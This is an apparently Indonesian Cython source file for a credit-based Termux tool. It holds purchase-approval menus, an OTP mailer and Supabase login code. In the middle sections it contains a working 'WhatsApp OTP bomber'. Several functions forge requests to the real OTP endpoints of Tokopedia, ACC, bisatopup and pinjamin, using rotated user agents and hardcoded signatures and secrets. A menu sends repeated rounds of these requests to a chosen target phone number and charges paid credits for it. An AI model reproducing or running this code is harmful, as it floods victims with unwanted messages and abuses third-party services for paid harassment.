                        f"   [bold red]Email[/bold red]: {ADMIN_EMAIL}\n\n"
                        f"[bold cyan]3.[/bold cyan] Sertakan ID Pesanan:\n"
                        f"   [bold magenta]{purchase_id}[/bold magenta]\n\n"
                        f"[dim]Credit akan ditambahkan setelah admin approve[/dim]"
                    )
                    console.print(Panel(instruction, border_style="green", title="[bold green]✅ PESANAN DIBUAT[/bold green]"))
                else:
                    error("Gagal menyimpan pesanan!")
                    if result:
                        error(f"Detail: {result}")
                
                print()
                input(f" {D}Tekan Enter...{R}")
                
            elif sel == 1:
                clear()
                print()
                loading_tqdm("Mengambil riwayat", 20)
                purchases = get_user_purchases(user_id)
                if purchases:
                    tx_table = Table(title="[bold cyan]📋 RIWAYAT PEMBELIAN[/bold cyan]")
                    tx_table.add_column("ID", style="cyan", max_width=20)
                    tx_table.add_column("Credit", style="yellow")
                    tx_table.add_column("Total", style="green")
                    tx_table.add_column("Metode", style="white")
                    tx_table.add_column("Status", style="white")
                    
                    for tx in purchases[:10]:
                        status = tx.get("status", "unknown")
                        if status == "approved":
                            status_display = "[green]Approved[/green]"
                        elif status == "pending":
                            status_display = "[yellow]Pending[/yellow]"
                        elif status == "rejected":
                            status_display = "[red]Rejected[/red]"
                        else:
                            status_display = f"[dim]{status}[/dim]"
                        
                        tx_table.add_row(
                            tx.get("id", "")[:20],
                            str(tx.get("credit_amount", 0)),
                            f"Rp{tx.get('total_amount', 0):,}",
                            tx.get("payment_method", "N/A"),
                            status_display
                        )
                    console.print(tx_table)
                else:
                    info("Belum ada riwayat pembelian")
                print()
                input(f" {D}Tekan Enter...{R}")
                
            elif sel == 2 or sel is None:
                break
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)

cpdef void admin_purchases_menu(dict cfg):
    cdef int sel, action_sel
    cdef list purchases, pending
    cdef dict purchase, p
    cdef str confirm
    cdef bint ok
    cdef int pending_count, total_purchases, total_approved, total_rejected
    
    try:
        while True:
            clear()
            print()
            
            pending = get_pending_purchases()
            all_purchases = get_all_purchases()
            
            pending_count = len(pending)
            total_purchases = len(all_purchases)
            total_approved = 0
            total_rejected = 0
            for p in all_purchases:
                if p.get("status") == "approved":
                    total_approved = total_approved + 1
                elif p.get("status") == "rejected":
                    total_rejected = total_rejected + 1
            
            header_content = (
                f"[bold magenta]KELOLA PEMBELIAN CREDIT[/bold magenta]\n\n"
                f"[bold yellow]Pending[/bold yellow]: {pending_count} | "
                f"[bold green]Approved[/bold green]: {total_approved} | "
                f"[bold red]Rejected[/bold red]: {total_rejected} | "
                f"[bold white]Total[/bold white]: {total_purchases}"
            )
            console.print(Panel(
                header_content,
                border_style="magenta",
                padding=(1, 2)
            ))
            
            title_box = f"\n{MG}{B}  Pilih Menu:{R}"
            
            purchase_options = [
                f"{B}  [1]  Pending      -  Lihat & proses pesanan ({pending_count}){R}",
                f"{B}  [2]  Semua        -  Lihat semua riwayat{R}",
                f"{B}  [0]  Kembali      -  Admin panel{R}",
            ]
            
            purchase_menu = TerminalMenu(
                menu_entries=purchase_options,
                title=title_box,
                menu_cursor=" ▶ ",
                menu_cursor_style=("fg_purple", "bold"),
                menu_highlight_style=("fg_cyan", "bold"),
            )
            
            sel = purchase_menu.show()
            
            if sel == 0:
                clear()
                print()
                
                if not pending:
                    info("Tidak ada pesanan pending")
                    input(f"\n {D}Tekan Enter...{R}")
                    continue
                
                pending_table = Table(title="[bold yellow]📦 PESANAN PENDING[/bold yellow]")
                pending_table.add_column("No", style="dim", width=4)
                pending_table.add_column("ID", style="cyan", max_width=25)
                pending_table.add_column("Email", style="white", max_width=25)
                pending_table.add_column("Credit", style="yellow")
                pending_table.add_column("Total", style="green")
                pending_table.add_column("Metode", style="cyan")
                
                for idx, p in enumerate(pending[:20], 1):
                    pending_table.add_row(
                        str(idx),
                        p.get("id", "")[:25],
                        p.get("user_email", "")[:25],
                        str(p.get("credit_amount", 0)),
                        f"Rp{p.get('total_amount', 0):,}",
                        p.get("payment_method", "N/A")
                    )
                
                console.print(pending_table)
                print()
                
                menu_options = []
                for idx, p in enumerate(pending[:20], 1):
                    menu_options.append(f"{B}{idx}. {p.get('user_email', '')[:20]} - {p.get('credit_amount', 0)} Credit{R}")
                menu_options.append(f"{B}<- Kembali{R}")
                
                select_menu = TerminalMenu(
                    menu_entries=menu_options,
                    title=f"\n{YL}  Pilih pesanan untuk proses:{R}",
                    menu_cursor=" > ",
                    menu_cursor_style=("fg_yellow", "bold"),
                    menu_highlight_style=("fg_green", "bold"),
                )
                
                p_sel = select_menu.show()
                
                if p_sel is None or p_sel == len(pending[:20]):
                    continue
                
                purchase = pending[p_sel]
                
                clear()
                print()
                
                detail_content = (
                    f"[bold white]ID Pesanan[/bold white]\n"
                    f"[dim]{purchase.get('id', 'N/A')}[/dim]\n\n"
                    f"[bold white]Email User[/bold white]\n"
                    f"[cyan]{purchase.get('user_email', 'N/A')}[/cyan]\n\n"
                    f"[bold white]User ID[/bold white]\n"
                    f"[dim]{purchase.get('user_id', 'N/A')[:20]}...[/dim]\n\n"
                    f"[bold white]Jumlah Credit[/bold white]\n"
                    f"[bold yellow]{purchase.get('credit_amount', 0)}[/bold yellow] Credit\n\n"
                    f"[bold white]Total Bayar[/bold white]\n"
                    f"[bold green]Rp{purchase.get('total_amount', 0):,}[/bold green]\n\n"
                    f"[bold white]Metode Pembayaran[/bold white]\n"
                    f"[cyan]{purchase.get('payment_method', 'N/A')}[/cyan]"
                )
                console.print(Panel(
                    detail_content,
                    border_style="yellow",
                    padding=(1, 2),
                    title="[bold yellow]📋 DETAIL PESANAN[/bold yellow]"
                ))
                
                print()
                
                action_options = [
                    f"{GR}{B}  [1]  APPROVE  -  Setujui & tambah credit{R}",
                    f"{RD}{B}  [2]  REJECT   -  Tolak pesanan{R}",
                    f"{B}  [0]  Batal    -  Kembali{R}",
                ]
                
                action_menu = TerminalMenu(
                    menu_entries=action_options,
                    title=f"\n{CY}  Pilih aksi:{R}",
                    menu_cursor=" > ",
                    menu_cursor_style=("fg_cyan", "bold"),
                    menu_highlight_style=("fg_green", "bold"),
                )
                
                action_sel = action_menu.show()
                
                if action_sel == 0:
                    confirm = input(f"\n {GR}[?]{R} Ketik 'APPROVE' untuk konfirmasi: {CY}").strip()
                    print(R, end="")
                    
                    if confirm == "APPROVE":
                        loading_tqdm("Memproses approval", 30)
                        
                        purchase_id = purchase.get("id", "")
                        status_updated = update_purchase_status(purchase_id, "approved")
                        
                        if status_updated:
                            updated_purchase = get_purchase_by_id(purchase_id)
                            
                            if updated_purchase and updated_purchase.get("status") == "approved":
                                user_id = updated_purchase.get("user_id", "")
                                credit_amount = updated_purchase.get("credit_amount", 0)
                                user_email = updated_purchase.get("user_email", "")
                                total_amount = updated_purchase.get("total_amount", 0)
                                
                                add_credit(user_id, credit_amount)
                                
                                email_sent = send_purchase_email(
                                    cfg,
                                    user_email,
                                    f"✅ Pembelian Credit Disetujui - {credit_amount} Credit",
                                    purchase_status_template(
                                        user_email,
                                        credit_amount,
                                        total_amount,
                                        "approved",
                                        purchase_id
                                    )
                                )
                                
                                success(f"Pesanan {purchase_id[:15]} APPROVED!")
                                success(f"{credit_amount} credit ditambahkan ke {user_email}")
                                
                                if not email_sent:
                                    warning("Email notifikasi gagal dikirim!")
                            else:
                                error("Status pesanan tidak terupdate dengan benar!")
                        else:
                            error("Gagal mengupdate status pesanan! Cek koneksi database.")
                    else:
                        info("Dibatalkan")
                
                elif action_sel == 1:
                    confirm = input(f"\n {RD}[?]{R} Ketik 'REJECT' untuk konfirmasi: {CY}").strip()
                    print(R, end="")
                    
                    if confirm == "REJECT":
                        loading_tqdm("Memproses rejection", 30)
                        
                        purchase_id = purchase.get("id", "")
                        status_updated = update_purchase_status(purchase_id, "rejected")
                        
                        if status_updated:
                            updated_purchase = get_purchase_by_id(purchase_id)
                            
                            if updated_purchase and updated_purchase.get("status") == "rejected":
                                user_email = updated_purchase.get("user_email", "")
                                credit_amount = updated_purchase.get("credit_amount", 0)
                                total_amount = updated_purchase.get("total_amount", 0)
                                
                                email_sent = send_purchase_email(
                                    cfg,
                                    user_email,
                                    f"❌ Pembelian Credit Ditolak",
                                    purchase_status_template(
                                        user_email,
                                        credit_amount,
                                        total_amount,
                                        "rejected",
                                        purchase_id
                                    )
                                )
                                
                                success(f"Pesanan {purchase_id[:15]} REJECTED!")
                                
                                if not email_sent:
                                    warning("Email notifikasi gagal dikirim!")
                            else:
                                error("Status pesanan tidak terupdate dengan benar!")
                        else:
                            error("Gagal mengupdate status pesanan! Cek koneksi database.")
                    else:
                        info("Dibatalkan")
                
                print()
                input(f" {D}Tekan Enter...{R}")
                
            elif sel == 1:
                clear()
                print()
                loading_tqdm("Mengambil data", 20)
                
                all_purchases = get_all_purchases()
                
                if not all_purchases:
                    info("Belum ada riwayat pembelian")
                else:
                    all_table = Table(title="[bold cyan]📊 SEMUA PEMBELIAN[/bold cyan]")
                    all_table.add_column("ID", style="cyan", max_width=20)
                    all_table.add_column("Email", style="white", max_width=20)
                    all_table.add_column("Credit", style="yellow")
                    all_table.add_column("Total", style="green")
                    all_table.add_column("Metode", style="dim")
                    all_table.add_column("Status", style="white")
                    
                    total_income = 0
                    
                    for p in all_purchases[:20]:
                        status = p.get("status", "unknown")
                        if status == "approved":
                            status_display = "[green]Approved[/green]"
                            total_income += p.get("total_amount", 0)
                        elif status == "pending":
                            status_display = "[yellow]Pending[/yellow]"
                        elif status == "rejected":
                            status_display = "[red]Rejected[/red]"
                        else:
                            status_display = f"[dim]{status}[/dim]"
                        
                        all_table.add_row(
                            p.get("id", "")[:20],
                            p.get("user_email", "")[:20],
                            str(p.get("credit_amount", 0)),
                            f"Rp{p.get('total_amount', 0):,}",
                            p.get("payment_method", "N/A"),
                            status_display
                        )
                    
                    console.print(all_table)
                    print()
                    
                    stats_panel = Panel(
                        f"[bold green]Total Pendapatan (Approved)[/bold green]: [bold white]Rp{total_income:,}[/bold white]",
                        border_style="green",
                        title="[bold green]💰 STATISTIK[/bold green]"
                    )
                    console.print(stats_panel)
                
                print()
                input(f" {D}Tekan Enter...{R}")
                
            elif sel == 2 or sel is None:
                break
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)

cpdef str email_template(str otp, str to):
    return f'''<!DOCTYPE html><html><body style="margin:0;padding:0;font-family:Arial;background:#0f0f23">
<table style="width:100%"><tr><td align="center" style="padding:40px 0">
<table style="max-width:500px;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:20px;overflow:hidden">
<tr><td style="padding:40px;text-align:center">
<div style="font-size:50px;margin-bottom:20px">🔐</div>
<h1 style="color:#fff;margin:0">Kode Verifikasi</h1>
<p style="color:#888;margin:10px 0 30px">Termux Auth System</p>
<div style="background:linear-gradient(135deg,#667eea,#764ba2);border-radius:16px;padding:30px">
<p style="color:rgba(255,255,255,0.8);margin:0 0 10px;font-size:12px">KODE OTP</p>
<h2 style="color:#fff;font-size:48px;margin:0;letter-spacing:10px;font-family:monospace">{otp}</h2>
</div>
<p style="color:#f6ad55;margin:30px 0">⏱️ Berlaku 5 menit</p>
<div style="background:rgba(255,100,100,0.1);border:1px solid rgba(255,100,100,0.3);border-radius:10px;padding:15px">
<p style="color:#fc8181;margin:0;font-size:13px">⚠️ Jangan bagikan kode ini!</p>
</div>
</td></tr>
<tr><td style="padding:20px;background:rgba(0,0,0,0.2);text-align:center">
<p style="color:#666;font-size:12px;margin:0">Dikirim ke: {to}</p>
</td></tr></table></td></tr></table></body></html>'''

cpdef tuple send_email(dict cfg, str to, str otp):
    cdef str smtp_email = cfg.get("smtp_email", "")
    cdef str smtp_pass = cfg.get("smtp_app_password", "")
    if not smtp_email or not smtp_pass:
        return (False, "SMTP tidak dikonfigurasi")
    try:
        msg = MIMEMultipart('alternative')
        msg['Subject'] = f'🔐 Kode OTP: {otp}'
        msg['From'] = f'Termux Auth <{smtp_email}>'
        msg['To'] = to
        msg.attach(MIMEText(f'Kode OTP Anda: {otp}\nBerlaku 5 menit.', 'plain'))
        msg.attach(MIMEText(email_template(otp, to), 'html'))
        srv = smtplib.SMTP('smtp.gmail.com', 587)
        srv.starttls()
        srv.login(smtp_email, smtp_pass)
        srv.sendmail(smtp_email, to, msg.as_string())
        srv.quit()
        return (True, "OTP terkirim!")
    except smtplib.SMTPAuthenticationError:
        return (False, "Login SMTP gagal")
    except Exception as e:
        return (False, str(e))

cpdef tuple valid_phone(str phone):
    cdef str cleaned = phone.strip()
    if cleaned.startswith("+62"):
        cleaned = cleaned[3:]
    elif cleaned.startswith("62"):
        cleaned = cleaned[2:]
    elif cleaned.startswith("0"):
        cleaned = cleaned[1:]
    
    if not cleaned.startswith("8"):
        return (False, "", "Nomor harus diawali 8 (contoh: 895325844493)")
    
    if not cleaned.isdigit():
        return (False, "", "Nomor harus angka saja")
    
    if len(cleaned) < 9 or len(cleaned) > 13:
        return (False, "", "Panjang nomor tidak valid (9-13 digit)")
    
    return (True, cleaned, "")

used_user_agents = set()

cpdef str get_unique_ua():
    cdef int max_attempts = 50
    cdef int attempt = 0
    cdef str new_ua
    global used_user_agents
    
    try:
        ua = UserAgent()
        while attempt < max_attempts:
            new_ua = ua.random
            if new_ua not in used_user_agents:
                used_user_agents.add(new_ua)
                return new_ua
            attempt += 1
        used_user_agents.clear()
        new_ua = ua.random
        used_user_agents.add(new_ua)
        return new_ua
    except:
        return "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36"

cpdef tuple send_tokopedia(str phone):
    cdef str ua = get_unique_ua()
    cdef str url = "https://gql.tokopedia.com/graphql/OTPRequest"
    cdef str phone_with_62 = "62" + phone
    
    cdef list payload = [{
        "operationName": "OTPRequest",
        "variables": {
            "msisdn": phone_with_62,
            "MsisdnEnc": "",
            "EmailEnc": "",
            "otpType": "116",
            "mode": "whatsapp",
            "otpDigit": 6
        },
        "query": "query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) {\n  OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\n    success\n    message\n    errorMessage\n    prefixMisscall\n    message_title\n    message_sub_title\n    message_img_link\n    error_code\n  }\n}\n"
    }]
    
    cdef dict headers = {
        'User-Agent': ua,
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'x-version': "1607a8a",
        'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'x-source': "tokopedia-lite",
        'x-tkpd-akamai': "otp",
        'x-tkpd-lite-service': "oauth",
        'origin': "https://www.tokopedia.com",
        'x-requested-with': "mark.via.gp",
        'sec-fetch-site': "same-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.tokopedia.com/",
        'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        'priority': "u=1, i"
    }
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=30)
        if r.status_code == 200:
            return (True, "Tokopedia")
        return (False, f"Tokopedia: {r.status_code}")
    except Exception as e:
        return (False, f"Tokopedia: {str(e)[:30]}")

cpdef tuple send_acc(str phone):
    cdef str ua = get_unique_ua()
    cdef str url = "https://www.acc.co.id/register/new-account"
    cdef str phone_with_0 = "0" + phone
    
    cdef str payload = json.dumps([{
        "user_id": None,
        "action": "register",
        "send_to": phone_with_0,
        "provider": "whatsapp"
    }])
    
    cdef dict headers = {
        'User-Agent': ua,
        'Accept': "text/x-component",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "text/plain",
        'sec-ch-ua-platform': '"Android"',
        'next-action': "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7",
        'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': "?1",
        'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        'Origin': "https://www.acc.co.id",
        'X-Requested-With': "mark.via.gp",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://www.acc.co.id/register/new-account",
        'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=30)
        if r.status_code == 200:
            return (True, "ACC")
        return (False, f"ACC: {r.status_code}")
    except Exception as e:
        return (False, f"ACC: {str(e)[:30]}")

cpdef tuple send_fazpass(str phone):
    cdef str ua = get_unique_ua()
    cdef str phone_with_0 = "0" + phone
    cdef str timestamp = datetime.now().strftime("%Y-%m-%dT%H:%M:%S+0700")
    cdef str url = f"https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=02cd7dbc08842ce277&version_name=6.14.07&version=61407"
    
    cdef str payload = f"phone_number={phone_with_0}"
    
    cdef dict headers = {
        'User-Agent': ua,
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'authorization': "Bearer null",
        'x-signature': "84ffe05edd4fd46210d0085b6993840eb4358fd358744bc16676ee987cc0a33d",
        'x-timestamp': timestamp,
        'x-secret': "eff518bf1ce3ce25fae4424f8ed2bd0177244f32bdbc192fca5d0891f298180b",
        'cache-control': "max-age=432000",
        'Content-Type': "application/x-www-form-urlencoded"
    }
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=30)
        if r.status_code == 200:
            return (True, "Fazpass")
        return (False, f"Fazpass: {r.status_code}")
    except Exception as e:
        return (False, f"Fazpass: {str(e)[:30]}")

cpdef tuple send_pinjam_min(str phone):
    cdef str ua = get_unique_ua()
    cdef str url = "https://api.pinjamin.com/ina/util/verify-code"
    
    cdef dict payload = {
        "sign": "4fceed9522eb49553a223d76f88b436d",
        "phone": phone,
        "type": 1
    }
    
    cdef dict headers = {
        'User-Agent': ua,
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'X-VERSION': "2.2.4",
        'sec-ch-ua': '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
        'X-TOKEN': "",
        'sec-ch-ua-mobile': "?1",
        'X-SOURCE': "",
        'X-applicationId': "com.pinjamwinwin",
        'X-CHANNEL': "Pinjamwinwin",
        'Origin': "https://web.pinjamin.com",
        'X-Requested-With': "com.pinjamwinwin",
        'Sec-Fetch-Site': "same-site",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://web.pinjamin.com/",
        'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=30)
        if r.status_code == 200:
            return (True, "Pinjam Min")
        return (False, f"Pinjam Min: {r.status_code}")
    except Exception as e:
        return (False, f"Pinjam Min: {str(e)[:30]}")

WA_SERVICES = [
    ("ACC", send_acc),
    ("Pinjam Min", send_pinjam_min),
]

cpdef void do_sms_config_with_cfg(dict cfg, str user_id):
    cdef str phone_input, phone_clean, msg, send_count_input
    cdef bint valid, ok
    cdef int i, sel, success_count, fail_count, total_services, send_count, round_num, total_requests
    cdef int current_credit, used_count, new_credit
    cdef list results
    global used_user_agents
    
    used_user_agents.clear()
    
    clear()
    print()
    
    current_credit = get_user_credit(user_id)
    used_count = get_user_used(user_id)
    
    if current_credit < 1:
        console.print(Panel(
            f"[bold red]CREDIT HABIS![/bold red]\n\n"
            f"[bold white]Credit Anda:[/bold white] [red]{current_credit}[/red]\n"
            f"[bold white]Total Pemakaian:[/bold white] {used_count}x\n\n"
            f"[dim]Hubungi admin untuk menambah credit.[/dim]",
            border_style="red",
            padding=(1, 2)
        ))
        return
    
    console.print(Panel(
        f"[bold cyan]WHATSAPP OTP BOMBER[/bold cyan]\n"
        f"[dim]Type: WhatsApp | Max: 4x pengiriman[/dim]\n\n"
        f"[bold yellow]💳 Credit Tersisa:[/bold yellow] [green]{current_credit}[/green] | [dim]Pemakaian: {used_count}x[/dim]",
        border_style="cyan",
        padding=(1, 2)
    ))
    
    print()
    console.print(f" [bold yellow][!][/bold yellow] Format: 8xxxxxxxxx (tanpa +62/0)")
    console.print(f" [bold yellow][!][/bold yellow] Contoh: 895325844493")
    print()
    
    phone_input = input(f" {GR}[?]{R} Nomor Target : {CY}").strip()
    print(R, end="")
    
    valid, phone_clean, msg = valid_phone(phone_input)
    if not valid:
        error(msg)
        input(f"\n {D}Tekan Enter...{R}")
        return
    
    print()
    console.print(f" [bold yellow][!][/bold yellow] Jumlah pengiriman (1-4)")
    send_count_input = input(f" {GR}[?]{R} Jumlah Send  : {CY}").strip()
    print(R, end="")
    
    try:
        send_count = int(send_count_input)
        if send_count < 1:
            send_count = 1
        elif send_count > 4:
            send_count = 4
    except:
        error("Input tidak valid, menggunakan default: 1")
        send_count = 1
    
    if current_credit < send_count:
        print()
        console.print(Panel(
            f"[bold red]CREDIT TIDAK CUKUP![/bold red]\n\n"
            f"[bold white]Credit Anda:[/bold white] [red]{current_credit}[/red]\n"
            f"[bold white]Dibutuhkan:[/bold white] [yellow]{send_count}[/yellow] (untuk {send_count}x round)\n\n"
            f"[dim]Kurangi jumlah round atau hubungi admin untuk menambah credit.[/dim]",
            border_style="red",
            padding=(1, 2)
        ))
        return
    
    total_services = len(WA_SERVICES)
    total_requests = total_services * send_count
    
    print()
    target_box = (
        f"[bold white on green]  📱 TARGET INFO  [/bold white on green]\n\n"
        f"[bold green]┃[/bold green] [bold white]📞 Target[/bold white]     [dim]::[/dim] [bold cyan]+62{phone_clean}[/bold cyan]\n"
        f"[bold green]┃[/bold green] [bold white]🔧 Layanan[/bold white]    [dim]::[/dim] [bold yellow]{total_services}[/bold yellow] WhatsApp Services\n"
        f"[bold green]┃[/bold green] [bold white]🔄 Pengiriman[/bold white] [dim]::[/dim] [bold magenta]{send_count}x[/bold magenta] round\n"
        f"[bold green]┃[/bold green] [bold white]📊 Total[/bold white]      [dim]::[/dim] [bold blue]{total_requests}[/bold blue] request\n"
        f"[bold green]╰[/bold green][dim]─────────────────────────────────[/dim]\n"
        f"[bold yellow]💳[/bold yellow] [bold red]{send_count}[/bold red] credit akan digunakan"
    )
    console.print(Panel(
        target_box,
        border_style="green",
        padding=(1, 2),
        title="[bold green]★ KONFIRMASI ★[/bold green]",
        subtitle="[dim]WhatsApp OTP Sender[/dim]"
    ))
    print()
    
    service_header = Table(show_header=True, header_style="bold cyan", box=None)
    service_header.add_column("No", style="cyan", width=4)
    service_header.add_column("Nama Layanan", style="white")
    service_header.add_column("Status", style="green", width=10)
    for idx, (name, _) in enumerate(WA_SERVICES, 1):
        service_header.add_row(f"{idx}.", name, "✓ Ready")
    console.print(Panel(service_header, title="[bold white]📋 DAFTAR LAYANAN[/bold white]", border_style="cyan"))
    print()
    
    options = [
        f"{B}Mulai Kirim - Kirim ke semua layanan ({send_count} credit){R}",
        f"{B}← Batal{R}",
    ]
    
    menu = TerminalMenu(
        menu_entries=options,
        title=f"\n{GR}Pilih Aksi:{R}",
        menu_cursor="▶ ",
        menu_cursor_style=("fg_red",),
        menu_highlight_style=("fg_yellow", "bold"),
    )
    
    sel = menu.show()
    
    if sel is None or sel == 1:
        info("Dibatalkan")
        return
    
    if not use_credit(user_id, send_count):
        print()
        error("Gagal mengurangi credit! Credit tidak cukup.")
        return
    
    new_credit = get_user_credit(user_id)
    print()
    console.print(Panel(
        f"[bold yellow]💳 {send_count} Credit digunakan[/bold yellow]\n"
        f"[bold white]Credit Tersisa:[/bold white] [green]{new_credit}[/green]",
        border_style="yellow",
        padding=(0, 2)
    ))
    time.sleep(1)
    
    clear()
    print()
    
    console.print(Panel(
        f"[bold white]MENGIRIM OTP VIA WHATSAPP[/bold white]\n"
        f"[dim]Target: +62{phone_clean} | {send_count}x Send | Tekan CTRL+C untuk stop[/dim]",
        border_style="magenta",
        padding=(0, 2)
    ))
    print()
    
    success_count = 0
    fail_count = 0
    results = []
    
    try:
        for round_num in range(1, send_count + 1):
            console.print(f"\n [bold white]═══════════════════════════════════════[/bold white]")
            console.print(f" [bold cyan]  ROUND {round_num}/{send_count}[/bold cyan]")
            console.print(f" [bold white]═══════════════════════════════════════[/bold white]\n")
            
            round_results = []
            
            for i, (name, func) in enumerate(WA_SERVICES):
                request_num = (round_num - 1) * total_services + i + 1
                
                console.print(f" [cyan]┌─────────────────────────────────────┐[/cyan]")
                console.print(f" [cyan]│[/cyan] [bold white]Layanan:[/bold white] {name:<27}[cyan]│[/cyan]")
                console.print(f" [cyan]│[/cyan] [bold white]Request:[/bold white] {request_num}/{total_requests:<24} [cyan]│[/cyan]")
                console.print(f" [cyan]└─────────────────────────────────────┘[/cyan]")
                
                print(f"  ", end="")
                for step in tqdm(range(20), desc="Mengirim", colour="cyan",
                                 bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}",
                                 ncols=45, leave=False):
                    if step == 10:
                        ok, result_msg = func(phone_clean)
                    time.sleep(0.05)
                
                if ok:
                    success_count += 1
                    round_results.append((name, True, "Terkirim"))
                    console.print(f"   [bold green]✓[/bold green] Status: [green]BERHASIL[/green]")
                    play_send_success_sound()
                    save_otp_log(user_id, phone_clean, "success", name)
                else:
                    fail_count += 1
                    round_results.append((name, False, result_msg[:20]))
                    console.print(f"   [bold red]✗[/bold red] Status: [red]GAGAL[/red] - {result_msg[:25]}")
                    play_send_fail_sound()
                    save_otp_log(user_id, phone_clean, "failed", name)
                
                results.append((str(request_num), f"R{round_num}-{name}", "[green]OK[/green]" if ok else "[red]GAGAL[/red]", "Terkirim" if ok else result_msg[:15]))
                print()
            
            if round_num < send_count:
                print()
                console.print(Panel(
                    f"[bold yellow]DELAY 60 DETIK[/bold yellow]\n"
                    f"[dim]Sebelum round berikutnya...[/dim]",
                    border_style="yellow",
                    padding=(0, 2)
                ))
                print()
                
                for sec in tqdm(range(60), desc="  Menunggu", colour="yellow",
                                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} detik",
                                ncols=50):
                    time.sleep(1)
                print()
        
        print()
        console.print(Panel(
            f"[bold white]════════════ HASIL PENGIRIMAN ════════════[/bold white]",
            border_style="cyan",
            padding=(0, 2)
        ))
        print()
        
        result_table = Table(show_header=True, header_style="bold cyan", box=None)
        result_table.add_column("No", style="dim", width=4)
        result_table.add_column("Layanan", width=18)
        result_table.add_column("Status", width=12)
        result_table.add_column("Keterangan", width=20)
        
        for row in results:
            result_table.add_row(*row)
        
        console.print(result_table)
        
        print()
        console.print(Panel(
            f"[bold green]✓ Berhasil[/bold green]: {success_count}/{total_requests}\n"
            f"[bold red]✗ Gagal[/bold red]: {fail_count}/{total_requests}\n"
            f"[bold cyan]➤ Total Round[/bold cyan]: {send_count}",
            border_style="green" if success_count > fail_count else "red",
            padding=(0, 2)
        ))
        
        update_target_rounds(user_id, phone_clean, send_count)
        
    except KeyboardInterrupt:
        print()
        print()
        info("Proses dihentikan oleh user (CTRL+C)")
        print()
        
        if results:
            result_table = Table(show_header=True, header_style="bold cyan", box=None)
            result_table.add_column("No", style="dim", width=4)
            result_table.add_column("Layanan", width=18)
            result_table.add_column("Status", width=12)
            result_table.add_column("Keterangan", width=20)
            
            for row in results:
                result_table.add_row(*row)
            
            console.print(result_table)
        
        print()
        console.print(Panel(
            f"[bold yellow]TERHENTI[/bold yellow]\n"
            f"[bold green]✓ Berhasil[/bold green]: {success_count}\n"
            f"[bold red]✗ Gagal[/bold red]: {fail_count}\n"
            f"[dim]Terkirim: {success_count + fail_count}/{total_requests}[/dim]",
            border_style="yellow",
            padding=(0, 2)
        ))
    


cdef class Auth:
    cdef str url
    cdef dict h
    cdef str service_key
    
    def __init__(self, str url, str key, str svc_key=""):
        self.url = url
        self.h = {"apikey": key, "Content-Type": "application/json"}
        self.service_key = svc_key
    
    cpdef tuple signup(self, str email, str pw):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.post(f"{self.url}/auth/v1/admin/users", 
                json={
                    "email": email, 
                    "password": pw,
                    "email_confirm": False
                }, headers=admin_h)
            d = r.json()
            if r.status_code == 200:
                uid = d.get("id", "")
                return (True, {"uid": uid, "email": email})
            elif r.status_code == 422 or "already been registered" in str(d):
                return (False, {"error": "Email sudah terdaftar"})
            return (False, {"error": d.get("msg", d.get("error_description", "Gagal"))})
        except Exception as e:
            return (False, {"error": str(e)})
    
    cpdef tuple login(self, str email, str pw):
        try:
            r = requests.post(f"{self.url}/auth/v1/token?grant_type=password",
                json={"email": email, "password": pw}, headers=self.h)
            d = r.json()
            if r.status_code == 200:
                return (True, {"uid": d.get("user", {}).get("id"), 
                    "email": d.get("user", {}).get("email"),
                    "token": d.get("access_token")})
            err = d.get("error_description", "")
            if "not confirmed" in err.lower():
                return (False, {"error": "UNVERIFIED", "email": email})
